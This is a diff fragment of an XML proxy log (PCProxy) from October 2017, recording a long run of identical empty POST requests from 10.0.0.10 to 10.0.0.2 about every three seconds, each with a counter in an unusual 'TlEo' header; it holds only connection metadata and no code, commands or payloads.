+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49398</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>107</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:14'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49398</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:17'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49399</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:17'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49399</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>108</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49399</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:20'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49400</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:20'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49400</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>109</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49400</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:23'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49401</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:23'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49401</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>110</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:23'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49401</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:26'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49402</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:26'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000006f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000006f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49402</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>111</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49402</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:28'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49403</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:28'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000070
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000070</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49403</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>112</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:28'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49403</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:31'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49404</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:31'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000071
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000071</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49404</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>113</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49404</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:34'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49405</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:34'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000072
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000072</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49405</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>114</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49405</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:37'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49406</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:37'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000073
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000073</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49406</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>115</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49406</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:40'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49407</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:40'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000074
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000074</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49407</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>116</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49407</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:43'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49408</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:43'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000075
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000075</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49408</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>117</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49408</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:45'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49409</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:45'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000076
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000076</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49409</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>118</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:45'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49409</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:48'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49410</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:48'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000077
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000077</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49410</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>119</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:48'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49410</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:51'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49411</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:51'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000078
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000078</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49411</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>120</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49411</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:54'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49412</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:54'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000079
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000079</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49412</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>121</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49412</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:57'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49413</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:57'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49413</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>122</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49413</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:46:59'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:46:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49414</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:46:59'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:46:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49414</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>123</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:46:59'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49414</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:02'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49415</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:02'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49415</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>124</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:02'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49415</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:05'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:47:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49416</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:47:05'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000007d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000007d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:47:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49416</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>125</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:47:05'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49416</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:47:08'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
